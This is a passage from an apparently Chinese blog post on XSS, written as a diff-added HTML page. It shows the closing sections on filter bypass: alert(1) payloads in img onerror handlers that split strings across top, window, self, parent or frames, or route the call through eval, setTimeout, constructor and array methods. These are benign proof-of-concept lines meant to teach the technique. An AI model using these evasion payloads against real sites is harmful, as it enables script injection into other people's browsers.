+<h4 id="0x02-top"><a href="#0x02-top" class="headerlink" title="0x02. top"></a>0x02. top</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x03-window"><a href="#0x03-window" class="headerlink" title="0x03. window"></a>0x03. window</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x04-self"><a href="#0x04-self" class="headerlink" title="0x04. self"></a>0x04. self</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;self[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x05-parent"><a href="#0x05-parent" class="headerlink" title="0x05. parent"></a>0x05. parent</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;parent[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x06-frames"><a href="#0x06-frames" class="headerlink" title="0x06. frames"></a>0x06. frames</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;frames[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x07-常用函数"><a href="#0x07-常用函数" class="headerlink" title="0x07. 常用函数"></a>0x07. 常用函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;open(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;document.write(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setTimeout(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setInterval(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Set.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Map.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Array.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;WeakSet.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;constructor.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].map(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].find(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].every(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].filter(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].forEach(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].findIndex(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="7-8、赋值拼接"><a href="#7-8、赋值拼接" class="headerlink" title="7.8、赋值拼接"></a>7.8、赋值拼接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src onerror=_=alert,_(1)&gt;</span><br><span class="line">&lt;img src x=al y=ert onerror=top[x+y](1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src onerror=top[a=&#x27;al&#x27;,b=&#x27;ev&#x27;,b+a](&#x27;alert(1)&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src onerror=[&#x27;ale&#x27;+&#x27;rt&#x27;].map(top[&#x27;ev&#x27;+&#x27;al&#x27;])[0][&#x27;valu&#x27;+&#x27;eOf&#x27;]()(1)&gt;</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/05/03/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB"><span class="nav-number">1.</span> <span class="nav-text">XSS跨站脚本请求伪造攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.</span> <span class="nav-text">1、原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81%E5%8D%B1%E5%AE%B3"><span class="nav-number">1.2.</span> <span class="nav-text">2、危害</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3%E3%80%81%E5%88%86%E7%B1%BB"><span class="nav-number">1.3.</span> <span class="nav-text">3、分类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1%E3%80%81%E5%8F%8D%E5%B0%84%E5%9E%8B%EF%BC%88%E9%9D%9E%E6%8C%81%E4%B9%85%E5%9E%8B%EF%BC%89"><span class="nav-number">1.3.1.</span> <span class="nav-text">3.1、反射型（非持久型）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2%E3%80%81%E5%AD%98%E5%82%A8%E5%9E%8B%EF%BC%88%E6%8C%81%E4%B9%85%E5%9E%8B%EF%BC%89"><span class="nav-number">1.3.2.</span> <span class="nav-text">3.2、存储型（持久型）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3%E3%80%81DOM%E5%9E%8B"><span class="nav-number">1.3.3.</span> <span class="nav-text">3.3、DOM型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4%E3%80%81UXSS%EF%BC%88%E9%80%9A%E7%94%A8%E5%9E%8Bxss%EF%BC%89"><span class="nav-number">1.3.4.</span> <span class="nav-text">3.4、UXSS（通用型xss）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-5%E3%80%81PDF-XSS"><span class="nav-number">1.3.5.</span> <span class="nav-text">3.5、PDF XSS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4%E3%80%81-xss-%E5%B8%B8%E8%A7%81%E6%A0%87%E7%AD%BE%E8%AF%AD%E5%8F%A5"><span class="nav-number">1.4.</span> <span class="nav-text">4、 xss 常见标签语句</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-lt-a-gt-%E6%A0%87%E7%AD%BE"><span class="nav-number">1.4.1.</span> <span class="nav-text">0x01. **&lt; a&gt;**标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-lt-img-gt-%E6%A0%87%E7%AD%BE"><span class="nav-number">1.4.2.</span> <span class="nav-text">0x02. &lt; img&gt;标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-lt-iframe-gt-%E6%A0%87%E7%AD%BE"><span class="nav-number">1.4.3.</span> <span class="nav-text">0x03. &lt; iframe&gt;标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-lt-audio-gt-%E6%A0%87%E7%AD%BE"><span class="nav-number">1.4.4.</span> <span class="nav-text">0x04. &lt; audio&gt; 标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-lt-video-gt-%E6%A0%87%E7%AD%BE"><span class="nav-number">1.4.5.</span> <span class="nav-text">0x05. &lt; video&gt;标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-lt-svg-gt-%E6%A0%87%E7%AD%BE"><span class="nav-number">1.4.6.</span> <span class="nav-text">0x06. &lt; svg&gt; 标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07-lt-button-gt-%E6%A0%87%E7%AD%BE"><span class="nav-number">1.4.7.</span> <span class="nav-text">0x07. &lt; button&gt; 标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x08-lt-div-gt-%E6%A0%87%E7%AD%BE"><span class="nav-number">1.4.8.</span> <span class="nav-text">0x08. &lt; div&gt;标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x09-lt-object-gt-%E6%A0%87%E7%AD%BE"><span class="nav-number">1.4.9.</span> <span class="nav-text">0x09. &lt; object&gt;标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x10-lt-script-gt-%E6%A0%87%E7%AD%BE"><span class="nav-number">1.4.10.</span> <span class="nav-text">0x10. &lt; script&gt; 标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x11-lt-p-gt-%E6%A0%87%E7%AD%BE"><span class="nav-number">1.4.11.</span> <span class="nav-text">0x11. &lt; p&gt; 标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x12-lt-input-gt-%E6%A0%87%E7%AD%BE"><span class="nav-number">1.4.12.</span> <span class="nav-text">0x12. &lt; input&gt; 标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x13-lt-details-gt-%E6%A0%87%E7%AD%BE"><span class="nav-number">1.4.13.</span> <span class="nav-text">0x13. &lt; details&gt;标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x14-lt-select-gt-%E6%A0%87%E7%AD%BE"><span class="nav-number">1.4.14.</span> <span class="nav-text">0x14. &lt; select&gt; 标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x15-lt-form-gt-%E6%A0%87%E7%AD%BE"><span class="nav-number">1.4.15.</span> <span class="nav-text">0x15. &lt; form&gt; 标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x16-lt-body-gt-%E6%A0%87%E7%AD%BE"><span class="nav-number">1.4.16.</span> <span class="nav-text">0x16. &lt; body&gt; 标签</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-XSS%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8"><span class="nav-number">1.5.</span> <span class="nav-text">5.XSS实战利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1%E3%80%81XSS%E5%88%A9%E7%94%A8%E5%B9%B3%E5%8F%B0"><span class="nav-number">1.5.1.</span> <span class="nav-text">5.1、XSS利用平台</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2%E3%80%81-%E5%90%8E%E5%8F%B0%E6%A4%8D%E5%85%A5Cookie-amp-%E8%A1%A8%E5%8D%95%E5%8A%AB%E6%8C%81"><span class="nav-number">1.5.2.</span> <span class="nav-text">5.2、**后台植入Cookie&amp;表单劫持  **</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3%E3%80%81Flash%E9%92%93%E9%B1%BC%E9%85%8D%E5%90%88%E6%9C%A8%E9%A9%AC%E6%8D%86%E7%BB%91%E4%B8%8A%E7%BA%BF"><span class="nav-number">1.5.3.</span> <span class="nav-text">5.3、Flash钓鱼配合木马捆绑上线</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-4%E3%80%81XSS%E9%9D%B6%E5%9C%BA"><span class="nav-number">1.5.4.</span> <span class="nav-text">5.4、XSS靶场</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-XSS%E4%BF%AE%E5%A4%8D"><span class="nav-number">1.6.</span> <span class="nav-text">6.XSS修复</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1%E3%80%81%E8%BF%87%E6%BB%A4%E5%8D%B1%E9%99%A9%E5%AD%97%E7%AC%A6"><span class="nav-number">1.6.1.</span> <span class="nav-text">6.1、过滤危险字符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2%E3%80%81HTTP-only"><span class="nav-number">1.6.2.</span> <span class="nav-text">6.2、HTTP-only</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-3%E3%80%81%E8%AE%BE%E7%BD%AECSP-Content-Security-Policy"><span class="nav-number">1.6.3.</span> <span class="nav-text">6.3、设置CSP(Content Security Policy)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-4%E3%80%81%E8%BE%93%E5%85%A5%E5%86%85%E5%AE%B9%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%EF%BC%8C%E5%AE%9E%E4%BD%93%E8%BD%AC%E4%B9%89%E7%AD%89"><span class="nav-number">1.6.4.</span> <span class="nav-text">6.4、输入内容长度限制，实体转义等</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-XSS-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">1.7.</span> <span class="nav-text">7.XSS 过滤绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#7-1%E3%80%81%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">1.7.1.</span> <span class="nav-text">7.1、编码绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-html-%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81"><span class="nav-number">1.7.1.1.</span> <span class="nav-text">0x01. html 实体编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-url-%E7%BC%96%E7%A0%81"><span class="nav-number">1.7.1.2.</span> <span class="nav-text">0x02. url 编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-js-%E7%BC%96%E7%A0%81"><span class="nav-number">1.7.1.3.</span> <span class="nav-text">0x03. js 编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-%E6%B7%B7%E5%90%88%E7%BC%96%E7%A0%81"><span class="nav-number">1.7.1.4.</span> <span class="nav-text">0x04. 混合编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x05-base64-%E7%BC%96%E7%A0%81"><span class="nav-number">1.7.1.5.</span> <span class="nav-text">0x05. base64 编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x06-ascii-%E7%BC%96%E7%A0%81"><span class="nav-number">1.7.1.6.</span> <span class="nav-text">0x06. ascii 编码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-2%E3%80%81%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">1.7.2.</span> <span class="nav-text">7.2、空格过滤绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-3%E3%80%81%E5%9C%86%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">1.7.3.</span> <span class="nav-text">7.3、圆括号过滤绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-%E5%8F%8D%E5%BC%95%E5%8F%B7%E6%9B%BF%E6%8D%A2"><span class="nav-number">1.7.3.1.</span> <span class="nav-text">0x01. 反引号替换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-throw-%E7%BB%95%E8%BF%87"><span class="nav-number">1.7.3.2.</span> <span class="nav-text">0x02. throw 绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-4%E3%80%81%E5%8D%95%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">1.7.4.</span> <span class="nav-text">7.4、单引号过滤绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-%E6%96%9C%E6%9D%A0%E6%9B%BF%E6%8D%A2"><span class="nav-number">1.7.4.1.</span> <span class="nav-text">0x01. 斜杠替换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-%E5%8F%8D%E5%BC%95%E5%8F%B7%E6%9B%BF%E6%8D%A2"><span class="nav-number">1.7.4.2.</span> <span class="nav-text">0x02. 反引号替换</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-5%E3%80%81alert-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">1.7.5.</span> <span class="nav-text">7.5、alert 过滤绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-prompt-%E6%9B%BF%E6%8D%A2"><span class="nav-number">1.7.5.1.</span> <span class="nav-text">0x01. prompt 替换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-confirm-%E6%9B%BF%E6%8D%A2"><span class="nav-number">1.7.5.2.</span> <span class="nav-text">0x02. confirm 替换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-console-log-%E6%9B%BF%E6%8D%A2"><span class="nav-number">1.7.5.3.</span> <span class="nav-text">0x03. console.log 替换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-document-write-%E6%9B%BF%E6%8D%A2"><span class="nav-number">1.7.5.4.</span> <span class="nav-text">0x04. document.write 替换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x05-base64-%E7%BB%95%E8%BF%87"><span class="nav-number">1.7.5.5.</span> <span class="nav-text">0x05. base64 绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-6%E3%80%81%E5%85%B3%E9%94%AE%E8%AF%8D%E7%BD%AE%E7%A9%BA%E7%BB%95%E8%BF%87"><span class="nav-number">1.7.6.</span> <span class="nav-text">7.6、关键词置空绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">1.7.6.1.</span> <span class="nav-text">0x01. 大小写绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">1.7.6.2.</span> <span class="nav-text">0x02. 双写绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-7%E3%80%81%E5%87%BD%E6%95%B0%E6%8B%BC%E6%8E%A5"><span class="nav-number">1.7.7.</span> <span class="nav-text">7.7、函数拼接</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-eval"><span class="nav-number">1.7.7.1.</span> <span class="nav-text">0x01. eval</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-top"><span class="nav-number">1.7.7.2.</span> <span class="nav-text">0x02. top</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-window"><span class="nav-number">1.7.7.3.</span> <span class="nav-text">0x03. window</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-self"><span class="nav-number">1.7.7.4.</span> <span class="nav-text">0x04. self</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x05-parent"><span class="nav-number">1.7.7.5.</span> <span class="nav-text">0x05. parent</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x06-frames"><span class="nav-number">1.7.7.6.</span> <span class="nav-text">0x06. frames</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x07-%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="nav-number">1.7.7.7.</span> <span class="nav-text">0x07. 常用函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-8%E3%80%81%E8%B5%8B%E5%80%BC%E6%8B%BC%E6%8E%A5"><span class="nav-number">1.7.8.</span> <span class="nav-text">7.8、赋值拼接</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">CSQ</p>
+  <div class="site-description" itemprop="description">学无止境</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">CSQ</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
